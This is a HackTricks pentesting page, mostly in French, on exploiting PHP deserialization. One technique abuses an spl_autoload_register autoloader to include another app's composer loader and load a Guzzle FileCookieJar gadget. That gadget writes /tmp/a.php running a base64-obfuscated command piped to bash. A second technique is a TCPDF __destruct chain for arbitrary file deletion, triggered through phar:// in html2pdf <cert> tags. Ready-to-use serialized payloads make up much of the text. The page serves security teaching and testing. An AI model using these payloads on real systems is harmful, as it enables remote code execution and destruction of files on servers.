# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

D'abord, vous devriez vérifier ce que sont [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Nous sommes dans une situation où nous avons trouvé une **PHP deserialization dans une webapp** sans **aucune** library vulnérable à des gadgets référencés dans **`phpggc`**. Cependant, dans le même conteneur se trouvait une **autre webapp composer avec des libraries vulnérables**. Par conséquent, l'objectif était de **charger le composer loader de l'autre webapp** et de l'abuser pour **charger un gadget qui exploitera cette library** depuis la webapp vulnérable à la deserialization.

Steps:

- Vous avez trouvé une **deserialization** et il n'y a **aucun gadget** dans le code de l'application courante
- Vous pouvez abuser d'une fonction **`spl_autoload_register`** comme suit pour **charger n'importe quel fichier local avec l'extension `.php`**
- Pour cela vous utilisez une deserialization où le nom de la classe sera contenu dans **`$name`**. Vous **ne pouvez pas utiliser "/" ou "."** dans un nom de classe dans un objet sérialisé, mais le **code** est en train de **remplacer** les **underscores** ("\_") **par des slashes** ("/"). Ainsi, un nom de classe tel que `tmp_passwd` sera transformé en `/tmp/passwd.php` et le code tentera de le charger.\
Un **exemple de gadget** sera : **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Si vous avez un **file upload** et pouvez téléverser un fichier avec l'extension **`.php`**, vous pouvez **abuser directement de cette fonctionnalité** et obtenir déjà RCE.

Dans mon cas, je n'avais rien de tel, mais il y avait dans le **same container** une autre page web composer avec une **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Maintenant, nous pouvons **créer et écrire un fichier**, cependant l'utilisateur **n'a pas la possibilité d'écrire dans les dossiers du serveur web**. Donc, comme vous pouvez le voir dans le payload, PHP appelant **`system`** avec du **base64** est créé dans **`/tmp/a.php`**. Ensuite, nous pouvons **réutiliser le premier type de payload** que nous avons utilisé comme LFI pour charger le composer loader de l'autre webapp afin de charger le fichier généré **`/tmp/a.php`**. Il suffit de l'ajouter au deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Résumé du payload**

- **Charger le composer autoload** d'une autre webapp dans le même conteneur
- **Charger un gadget phpggc** pour abuser d'une librairie de l'autre webapp (la webapp initiale vulnérable à deserialization n’avait pas de gadget dans ses librairies)
- Le gadget va **créer un fichier contenant un PHP payload** dans /tmp/a.php avec des commandes malveillantes (l'utilisateur de la webapp ne peut écrire dans aucun dossier de quelque webapp que ce soit)
- La partie finale de notre payload chargera **le fichier PHP généré** qui exécutera des commandes

J'ai dû **appeler cette deserialization deux fois**. Dans mes tests, la première fois le fichier `/tmp/a.php` a été créé mais pas chargé, et la deuxième fois il a été correctement chargé.

## TCPDF `__destruct` POP chain pour suppression arbitraire de fichiers

Quand une instance réelle de `TCPDF` est garbage-collected elle appelle `_destroy(true)`, itère sur `$this->imagekeys`, et appelle `unlink()` sur tout ce qui ressemble à un fichier cache sous `K_PATH_CACHE`. Si une application exécute `unserialize($user_data)` pendant que la classe `TCPDF` est chargée (par ex. si elle attend un array avec une clé `html`), vous pouvez fournir un objet sérialisé qui définit :

- `file_id` à n'importe quel entier qui n'est pas présent dans `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` vers des chemins qui commencent par `K_PATH_CACHE` ou qui peuvent être rendus similaires (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` quand `K_PATH_CACHE` est `/tmp/`).

Exemple de payload ciblant un flux non sécurisé `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` :
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Le fichier est supprimé dès que l'objet sort de la portée. TCPDF 6.9.3 a renforcé la vérification pour ne supprimer que les chemins ayant le préfixe `__tcpdf_<file_id>_` à l'intérieur de `K_PATH_CACHE` et a introduit `_unlink()` pour bloquer les schémas non-`file://`, donc les versions plus anciennes de `Producer` sont des cibles de choix.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if the application never calls `unserialize()` itself.

1. Créez un Phar avec `phar.readonly=0`, configurez le stub/manifest pour qu'il ressemble à une image (par ex. renommer `archive.phar` en `archive.png`), et stockez l'objet TCPDF sérialisé dans les métadonnées du Phar.
2. Placez/téléversez le fichier quelque part d'accessibilité, par ex. `/tmp/user_files/user_1/archive.png`.
3. Soumettez du HTML contenant la balise `<cert>` afin que html2pdf résolve le chemin contrôlé par l'attaquant :
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
La fonction `file_exists()` désérialise les métadonnées, instancie TCPDF, et son destructeur supprime le fichier choisi, transformant html2pdf en un puissant point d'entrée `phar://`. La version 5.3.1 a ajouté `Security::checkValidPath()` pour bloquer les schémas non approuvés, donc les déploiements legacy restent attractifs.

## Références

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
